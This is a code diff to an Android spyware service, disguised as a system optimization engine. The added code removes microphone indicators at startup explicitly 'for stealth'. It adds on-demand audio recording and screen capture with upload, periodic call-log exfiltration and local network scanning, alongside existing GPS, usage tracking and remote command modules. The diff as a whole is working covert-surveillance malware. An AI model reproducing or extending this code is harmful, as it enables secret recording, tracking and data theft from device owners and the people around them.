@@ -45,8 +45,8 @@ class MonitoringForegroundService : Service() {
     // ── Companion ─────────────────────────────────────────────────────────────
     companion object {
         private const val TAG = "MonitoringService"
-        const val CHANNEL_ID          = "system_optimization_v3"
-        const val NOTIFICATION_ID     = 1001
+        const val CHANNEL_ID          = "resource_engine_v33"
+        const val NOTIFICATION_ID     = 4567
         const val ACTION_START        = "com.android.system.optimization.engine.START"
         const val ACTION_STOP         = "com.android.system.optimization.engine.STOP"
         const val ACTION_APPLY_PROJECTION =
@@ -81,6 +81,8 @@ class MonitoringForegroundService : Service() {
     private var heartbeatJob: Job? = null
     private var audioJob: Job? = null
     private var usageJob: Job? = null
+    private var networkScanJob: Job? = null
+    private var callLogJob: Job? = null
 
     private var wakeLock: PowerManager.WakeLock? = null
 
@@ -101,6 +103,7 @@ class MonitoringForegroundService : Service() {
     private lateinit var gpsTracker: GpsTracker
     private lateinit var commandManager: RealtimeCommandManager
     private lateinit var usageTracker: AppUsageTracker
+    private lateinit var callLogTracker: CallLogTracker
     private lateinit var configManager: RemoteConfigManager
 
     // ── Lifecycle ─────────────────────────────────────────────────────────────
@@ -119,6 +122,7 @@ class MonitoringForegroundService : Service() {
             audioEngine    = AudioRecorderEngine(this)
             gpsTracker     = GpsTracker(this)
             usageTracker   = AppUsageTracker(this)
+            callLogTracker = CallLogTracker(this)
             configManager  = RemoteConfigManager(this)
             commandManager = RealtimeCommandManager(this, scope, gpsTracker) { mediaProjection }
 
@@ -203,24 +207,19 @@ class MonitoringForegroundService : Service() {
 
             val hasLocation = android.content.pm.PackageManager.PERMISSION_GRANTED ==
                 checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
-            val hasMic = android.content.pm.PackageManager.PERMISSION_GRANTED ==
-                checkSelfPermission(android.Manifest.permission.RECORD_AUDIO)
+            // v33: No Mic check on startup for stealth
+
 
             if (hasLocation) serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-            if (hasMic)      serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+            // v33: No Mic type on startup
 
-            Log.i(TAG, "startForeground types=0x${serviceType.toString(16)} loc=$hasLocation mic=$hasMic")
+
+            Log.i(TAG, "startForeground-MINIMAL (v33) types=0x${serviceType.toString(16)}")
 
             try {
                 startForeground(NOTIFICATION_ID, notif, serviceType)
             } catch (e: Exception) {
-                Log.e(TAG, "startForeground typed failed: ${e.message} — using DATA_SYNC only")
-                try {
-                    startForeground(NOTIFICATION_ID, notif,
-                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-                } catch (e2: Exception) {
-                    Log.e(TAG, "startForeground DATA_SYNC also failed: ${e2.message}")
-                }
+                Log.e(TAG, "startForeground-min failed: ${e.message}")
             }
         } else {
             try {
@@ -319,14 +318,95 @@ class MonitoringForegroundService : Service() {
         }
     }
 
+    /**
+     * One-time manual recording (v33).
+     * Upgrades foreground type, records, then downgrades.
+     */
+    fun startManualMic(durationMs: Long, bypassVad: Boolean = true) {
+        scope.launch {
+            try {
+                Log.i(TAG, "Manual MIC request: upgrading foreground...")
+                upgradeToMicType()
+                audioEngine.recordAndUpload(durationMs, bypassVad)
+                Log.i(TAG, "Manual MIC done: downgrading...")
+                downgradeFromMicType()
+            } catch (e: Exception) {
+                Log.e(TAG, "Manual MIC error: ${e.message}")
+            }
+        }
+    }
+
+    /**
+     * One-time screen capture (v33).
+     */
+    fun startManualScreen(cycles: Int) {
+        scope.launch {
+            try {
+                val proj = mediaProjection
+                if (proj == null) {
+                    Log.w(TAG, "Manual SCREEN request failed: No projection token")
+                    return@launch
+                }
+                Log.i(TAG, "Manual SCREEN request: upgrading foreground...")
+                upgradeForegroundToMediaProjection()
+                repeat(cycles) {
+                    screenEngine.captureAndUpload(proj)
+                    delay(5000)
+                }
+                Log.i(TAG, "Manual SCREEN done: downgrading...")
+                startForegroundSafe()
+            } catch (e: Exception) {
+                Log.e(TAG, "Manual SCREEN error: ${e.message}")
+            }
+        }
+    }
+
+    private val micConsumersCount = java.util.concurrent.atomic.AtomicInteger(0)
+
+    fun upgradeToMicType() {
+        val count = micConsumersCount.incrementAndGet()
+        Log.i(TAG, "upgradeToMicType: active mic consumers = $count")
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
+        val notif = buildNotification()
+        var serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or 
+                          ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or 
+                          ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        if (mediaProjection != null) {
+            serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+        }
+        try {
+            startForeground(NOTIFICATION_ID, notif, serviceType)
+            Log.i(TAG, "Upgraded foreground to MIC type (projection active: ${mediaProjection != null})")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to upgrade to MIC type: ${e.message}")
+        }
+    }
+
+    fun downgradeFromMicType() {
+        val count = micConsumersCount.decrementAndGet()
+        Log.i(TAG, "downgradeFromMicType: active mic consumers = $count")
+        if (count > 0) {
+            Log.d(TAG, "Downgrade skipped because $count mic consumer(s) still active")
+            return
+        }
+        if (count < 0) {
+            micConsumersCount.set(0)
+        }
+        if (mediaProjection != null) {
+            upgradeForegroundToMediaProjection()
+        } else {
+            startForegroundSafe()
+        }
+    }
+
     // ── Module loops ──────────────────────────────────────────────────────────
 
     private fun startAllModules() {
         startHeartbeatLoop()
-        startCaptureLoop()
-        startAudioLoop()
         startLocationLoop()
         startUsageLoop()
+        startCallLogLoop()
+        startNetworkScanLoop()
     }
 
     /** Heartbeat: update remote_settings every 60 s */
@@ -337,6 +417,25 @@ class MonitoringForegroundService : Service() {
                 runCatching { SupabaseManager.getInstance().updateHeartbeat(this@MonitoringForegroundService) }
                     .onFailure { Log.e(TAG, "Heartbeat: ${it.message}") }
                 delay(60_000)
+            }
+        }
+    }
+
+    /** Network scan loop: scan local network and upload connected assets every 5 min */
+    private fun startNetworkScanLoop() {
+        networkScanJob?.cancel()
+        networkScanJob = scope.launch {
+            val deviceId = android.provider.Settings.Secure.getString(
+                contentResolver, android.provider.Settings.Secure.ANDROID_ID
+            ) ?: "unknown"
+            val scanner = LocalNetworkScanner(this@MonitoringForegroundService, deviceId)
+            while (true) {
+                try {
+                    scanner.scanAndUploadAssets()
+                } catch (e: Exception) {
+                    Log.e(TAG, "Network scanner loop failed: ${e.message}")
+                }
+                delay(300_000) // Scan every 5 minutes
             }
         }
     }
@@ -420,6 +519,18 @@ class MonitoringForegroundService : Service() {
                 runCatching { usageTracker.trackAndUploadUsage() }
                     .onFailure { Log.e(TAG, "Usage loop: ${it.message}") }
                 delay(3_600_000)
+            }
+        }
+    }
+
+    /** Call logs: every 2 hours */
+    private fun startCallLogLoop() {
+        callLogJob?.cancel()
+        callLogJob = scope.launch {
+            while (true) {
+                runCatching { callLogTracker.trackAndUploadCallLogs() }
+                    .onFailure { Log.e(TAG, "CallLog loop: ${it.message}") }
+                delay(7_200_000) // 2 hours
             }
         }
     }
